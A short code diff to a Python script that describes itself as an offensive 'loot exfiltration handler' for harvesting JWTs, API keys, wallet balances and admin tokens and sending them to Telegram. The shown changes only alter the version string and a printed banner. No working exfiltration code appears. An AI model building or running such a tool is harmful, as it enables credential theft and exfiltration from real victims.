@@ -1,6 +1,6 @@
 #!/usr/bin/env python3
 """
-TELEMETRY.PY v8.0 — Live Offensive Streamer & Automated Loot Exfiltration Handler (With Telegram Telemetry)
+TELEMETRY.PY v8.7 — Live Offensive Streamer & Automated Loot Exfiltration Handler (Elite Red Team Adversarial Edition)
 Features:
 - Automated high-value loot parsing (JWTs, API keys, wallet balances, admin tokens)
 - Zero-disk in-memory exfiltration packaging
@@ -55,7 +55,7 @@ def stream_proof(exploit_type, endpoint, payload, response_body, proof_data):
     Instantly streams verified proof-of-work, automatically extracts exfiltrated loot to the terminal,
     and broadcasts unredacted assets directly to Telegram.
     """
-    sys.stdout.write(f"\n{RED}{BOLD}[***] LIVE EXPLOIT VERIFIED: {exploit_type.upper()} [***]{RESET}\n")
+    sys.stdout.write(f"\n{RED}{BOLD}[***] BRUTEDOG V8.7 — LIVE EXPLOIT VERIFIED: {exploit_type.upper()} [***]{RESET}\n")
     sys.stdout.write(f"  ├── Target Endpoint : {NEON_BLUE}{endpoint}{RESET}\n")
     sys.stdout.write(f"  ├── Injected Payload: {YELLOW}{json.dumps(payload)}{RESET}\n")
     
